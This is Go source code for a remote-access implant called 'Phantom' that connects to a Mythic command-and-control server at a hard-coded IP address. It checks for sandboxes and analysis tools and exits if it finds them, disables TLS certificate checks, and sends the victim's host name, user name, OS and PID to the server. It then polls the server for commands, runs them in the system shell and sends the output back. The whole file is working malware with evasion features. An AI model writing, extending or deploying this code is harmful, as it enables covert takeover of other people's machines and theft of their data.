package main

import (
	"bytes"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"
)

const (
	mythicURL = "https://37.27.249.191:7443"
	userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
)

type GraphQLQuery struct {
	Query     string                 `json:"query"`
	Variables map[string]interface{} `json:"variables"`
}

type GraphQLResponse struct {
	Data   map[string]interface{} `json:"data"`
	Errors []interface{}          `json:"errors"`
}

type CheckinData struct {
	Action       string `json:"action"`
	IP           string `json:"ip"`
	OS           string `json:"os"`
	User         string `json:"user"`
	Host         string `json:"host"`
	PID          int    `json:"pid"`
	UUID         string `json:"uuid"`
	Architecture string `json:"architecture"`
	PayloadType  string `json:"payload_type"`
	C2Profile    string `json:"c2_profile"`
}

func writeDebugLog(message string) {
	timestamp := time.Now().Format("2006-01-02 15:04:05")
	logFile, err := os.OpenFile("phantom_debug.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return
	}
	defer logFile.Close()
	logFile.WriteString(fmt.Sprintf("[%s] %s\n", timestamp, message))
}

func DetectSandbox() bool {
	writeDebugLog("Checking for sandbox environment...")
	
	sandboxProcesses := []string{
		"vmware", "virtualbox", "vbox", "qemu", "sandboxie", "wireshark",
		"procmon", "regmon", "filemon", "ollydbg", "ida", "windbg",
	}
	
	for _, proc := range sandboxProcesses {
		cmd := exec.Command("tasklist", "/FI", fmt.Sprintf("IMAGENAME eq %s.exe", proc))
		if output, err := cmd.Output(); err == nil {
			if strings.Contains(strings.ToLower(string(output)), proc) {
				writeDebugLog(fmt.Sprintf("Sandbox process detected: %s", proc))
				return true
			}
		}
	}
	
	writeDebugLog("No sandbox detected")
	return false
}

func createSecureClient() *http.Client {
	return &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true,
			},
		},
		Timeout: 30 * time.Second,
	}
}

func performMythicCheckin() error {
	writeDebugLog("Starting Mythic checkin process...")
	
	hostname, _ := os.Hostname()
	uuid := fmt.Sprintf("phantom-%d", time.Now().Unix())
	
	writeDebugLog(fmt.Sprintf("Generated UUID: %s", uuid))
	writeDebugLog(fmt.Sprintf("Hostname: %s", hostname))
	
	// Tentar múltiplos métodos de checkin
	methods := []func() error{
		func() error { return tryGraphQLCheckin(uuid, hostname) },
		func() error { return tryRESTCheckin(uuid, hostname) },
		func() error { return tryWebSocketCheckin(uuid, hostname) },
		func() error { return tryDirectCallback(uuid, hostname) },
	}
	
	for i, method := range methods {
		writeDebugLog(fmt.Sprintf("Trying checkin method %d...", i+1))
		if err := method(); err == nil {
			writeDebugLog(fmt.Sprintf("Checkin successful with method %d", i+1))
			return nil
		}
	}
	
	writeDebugLog("All checkin methods failed")
	return fmt.Errorf("all checkin methods failed")
}

func tryGraphQLCheckin(uuid, hostname string) error {
	writeDebugLog("Attempting GraphQL checkin...")
	
	query := GraphQLQuery{
		Query: `mutation newCallback($input: callbackInput!) {
			newCallback(input: $input) {
				status
				error
				id
			}
		}`,
		Variables: map[string]interface{}{
			"input": map[string]interface{}{
				"ip":           "127.0.0.1",
				"host":         hostname,
				"user":         os.Getenv("USERNAME"),
				"os":           runtime.GOOS,
				"architecture": runtime.GOARCH,
				"pid":          os.Getpid(),
				"uuid":         uuid,
				"payload_type": "phantom",
				"c2_profile":   "HTTP",
			},
		},
	}
	
	jsonData, err := json.Marshal(query)
	if err != nil {
		writeDebugLog(fmt.Sprintf("GraphQL marshal error: %s", err.Error()))
		return err
	}
	
	client := createSecureClient()
	
	endpoints := []string{"/graphql", "/api/graphql", "/new/graphql"}
	
	for _, endpoint := range endpoints {
		url := mythicURL + endpoint
		writeDebugLog(fmt.Sprintf("Trying GraphQL endpoint: %s", url))
		
		req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonData))
		if err != nil {
			continue
		}
		
		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("User-Agent", userAgent)
		
		resp, err := client.Do(req)
		if err != nil {
			writeDebugLog(fmt.Sprintf("GraphQL request error: %s", err.Error()))
			continue
		}
		
		body, _ := io.ReadAll(resp.Body)
		writeDebugLog(fmt.Sprintf("GraphQL response: %d - %s", resp.StatusCode, string(body)))
		resp.Body.Close()
		
		if resp.StatusCode == 200 {
			var graphqlResp GraphQLResponse
			if json.Unmarshal(body, &graphqlResp) == nil {
				if len(graphqlResp.Errors) == 0 {
					return nil
				}
			}
		}
	}
	
	return fmt.Errorf("GraphQL checkin failed")
}

func tryRESTCheckin(uuid, hostname string) error {
	writeDebugLog("Attempting REST API checkin...")
	
	checkinData := CheckinData{
		Action:       "checkin",
		IP:           "127.0.0.1",
		OS:           runtime.GOOS,
		User:         os.Getenv("USERNAME"),
		Host:         hostname,
		PID:          os.Getpid(),
		UUID:         uuid,
		Architecture: runtime.GOARCH,
		PayloadType:  "phantom",
		C2Profile:    "HTTP",
	}
	
	jsonData, err := json.Marshal(checkinData)
	if err != nil {
		return err
	}
	
	client := createSecureClient()
	
	endpoints := []string{
		"/api/v1.4/callbacks",
		"/api/v1.3/callbacks", 
		"/callbacks",
		"/new/callbacks",
		"/api/callbacks",
	}
	
	for _, endpoint := range endpoints {
		url := mythicURL + endpoint
		writeDebugLog(fmt.Sprintf("Trying REST endpoint: %s", url))
		
		req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonData))
		if err != nil {
			continue
		}
		
		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("User-Agent", userAgent)
		
		resp, err := client.Do(req)
		if err != nil {
			writeDebugLog(fmt.Sprintf("REST request error: %s", err.Error()))
			continue
		}
		
		body, _ := io.ReadAll(resp.Body)
		writeDebugLog(fmt.Sprintf("REST response: %d - %s", resp.StatusCode, string(body)))
		resp.Body.Close()
		
		if resp.StatusCode >= 200 && resp.StatusCode < 400 {
			return nil
		}
	}
	
	return fmt.Errorf("REST checkin failed")
}

func tryWebSocketCheckin(uuid, hostname string) error {
	writeDebugLog("WebSocket checkin not implemented - skipping")
	return fmt.Errorf("websocket not implemented")
}

func tryDirectCallback(uuid, hostname string) error {
	writeDebugLog("Attempting direct callback...")
	
	// Simular um callback HTTP simples
	data := fmt.Sprintf("uuid=%s&host=%s&user=%s&os=%s&arch=%s&pid=%d", 
		uuid, hostname, os.Getenv("USERNAME"), runtime.GOOS, runtime.GOARCH, os.Getpid())
	
	client := createSecureClient()
	
	endpoints := []string{"/", "/index.html", "/new/", "/callback"}
	
	for _, endpoint := range endpoints {
		url := mythicURL + endpoint
		writeDebugLog(fmt.Sprintf("Trying direct callback: %s", url))
		
		req, err := http.NewRequest("POST", url, strings.NewReader(data))
		if err != nil {
			continue
		}
		
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		req.Header.Set("User-Agent", userAgent)
		req.Header.Set("X-Phantom-UUID", uuid)
		req.Header.Set("X-Phantom-Host", hostname)
		
		resp, err := client.Do(req)
		if err != nil {
			writeDebugLog(fmt.Sprintf("Direct callback error: %s", err.Error()))
			continue
		}
		
		body, _ := io.ReadAll(resp.Body)
		writeDebugLog(fmt.Sprintf("Direct callback response: %d - %s", resp.StatusCode, string(body)))
		resp.Body.Close()
		
		// Aceitar qualquer resposta que não seja um erro explícito
		if resp.StatusCode != 404 && resp.StatusCode != 500 {
			return nil
		}
	}
	
	return fmt.Errorf("direct callback failed")
}

func checkForTasks() (string, error) {
	writeDebugLog("Checking for tasks...")
	
	hostname, _ := os.Hostname()
	uuid := fmt.Sprintf("phantom-%d", time.Now().Unix())
	
	client := createSecureClient()
	
	endpoints := []string{
		"/api/v1.4/tasks",
		"/tasks",
		"/new/tasks", 
		"/graphql",
		"/",
	}
	
	for _, endpoint := range endpoints {
		url := mythicURL + endpoint + "?uuid=" + uuid
		writeDebugLog(fmt.Sprintf("Checking tasks at: %s", url))
		
		req, err := http.NewRequest("GET", url, nil)
		if err != nil {
			continue
		}
		
		req.Header.Set("User-Agent", userAgent)
		req.Header.Set("X-Phantom-UUID", uuid)
		
		resp, err := client.Do(req)
		if err != nil {
			writeDebugLog(fmt.Sprintf("Task check error: %s", err.Error()))
			continue
		}
		
		if resp.StatusCode == 200 {
			body, err := io.ReadAll(resp.Body)
			resp.Body.Close()
			if err == nil && len(body) > 0 {
				bodyStr := string(body)
				writeDebugLog(fmt.Sprintf("Task response: %s", bodyStr))
				
				// Ignorar respostas HTML
				if !strings.Contains(bodyStr, "<html>") && 
				   !strings.Contains(bodyStr, "<!doctype") &&
				   len(bodyStr) > 5 {
					return bodyStr, nil
				}
			}
		} else {
			resp.Body.Close()
		}
	}
	
	return "", nil
}

func executeCommand(command string) string {
	writeDebugLog(fmt.Sprintf("Executing: %s", command))
	
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", command)
	} else {
		cmd = exec.Command("sh", "-c", command)
	}
	
	output, err := cmd.Output()
	if err != nil {
		writeDebugLog(fmt.Sprintf("Command error: %s", err.Error()))
		return fmt.Sprintf("Error: %s", err.Error())
	}
	
	result := string(output)
	writeDebugLog(fmt.Sprintf("Command output: %s", result))
	return result
}

func sendTaskResult(taskID, output string) error {
	writeDebugLog(fmt.Sprintf("Sending task result: %s", taskID))
	
	hostname, _ := os.Hostname()
	uuid := fmt.Sprintf("phantom-%d", time.Now().Unix())
	
	result := map[string]interface{}{
		"uuid":     uuid,
		"task_id":  taskID,
		"output":   base64.StdEncoding.EncodeToString([]byte(output)),
		"status":   "completed",
		"hostname": hostname,
	}
	
	jsonData, err := json.Marshal(result)
	if err != nil {
		return err
	}
	
	client := createSecureClient()
	
	endpoints := []string{
		"/api/v1.4/task_results",
		"/task_results",
		"/results", 
		"/",
	}
	
	for _, endpoint := range endpoints {
		url := mythicURL + endpoint
		writeDebugLog(fmt.Sprintf("Sending result to: %s", url))
		
		req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonData))
		if err != nil {
			continue
		}
		
		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("User-Agent", userAgent)
		req.Header.Set("X-Phantom-UUID", uuid)
		
		resp, err := client.Do(req)
		if err != nil {
			writeDebugLog(fmt.Sprintf("Result send error: %s", err.Error()))
			continue
		}
		
		writeDebugLog(fmt.Sprintf("Result response: %d", resp.StatusCode))
		resp.Body.Close()
		
		if resp.StatusCode >= 200 && resp.StatusCode < 400 {
			return nil
		}
	}
	
	return fmt.Errorf("failed to send task result")
}

func main() {
	writeDebugLog("=== PHANTOM MODERN MYTHIC AGENT STARTING ===")
	writeDebugLog(fmt.Sprintf("OS: %s, Arch: %s, PID: %d", runtime.GOOS, runtime.GOARCH, os.Getpid()))
	
	if DetectSandbox() {
		writeDebugLog("Sandbox detected - exiting")
		os.Exit(0)
	}
	
	// Delay inicial reduzido para debug
	delay := time.Duration(5+rand.Intn(10)) * time.Second
	writeDebugLog(fmt.Sprintf("Initial delay: %v", delay))
	time.Sleep(delay)
	
	// Tentar checkin
	if err := performMythicCheckin(); err != nil {
		writeDebugLog(fmt.Sprintf("Checkin failed: %s", err.Error()))
	} else {
		writeDebugLog("Checkin successful")
	}
	
	// Loop principal com limite para debug
	for i := 0; i < 20; i++ {
		writeDebugLog(fmt.Sprintf("Main loop iteration %d", i+1))
		
		task, err := checkForTasks()
		if err == nil && task != "" {
			writeDebugLog(fmt.Sprintf("Received task: %s", task))
			
			// Tentar extrair comando da resposta
			if strings.Contains(task, "cmd:") || strings.Contains(task, "command:") {
				lines := strings.Split(task, "\n")
				for _, line := range lines {
					if strings.Contains(line, "cmd:") {
						cmd := strings.TrimSpace(strings.Split(line, "cmd:")[1])
						output := executeCommand(cmd)
						sendTaskResult(fmt.Sprintf("task-%d", time.Now().Unix()), output)
						break
					}
				}
			}
		}
		
		// Jitter reduzido para debug
		jitter := time.Duration(3+rand.Intn(7)) * time.Second
		writeDebugLog(fmt.Sprintf("Sleeping: %v", jitter))
		time.Sleep(jitter)
	}
	
	writeDebugLog("Debug session completed")
}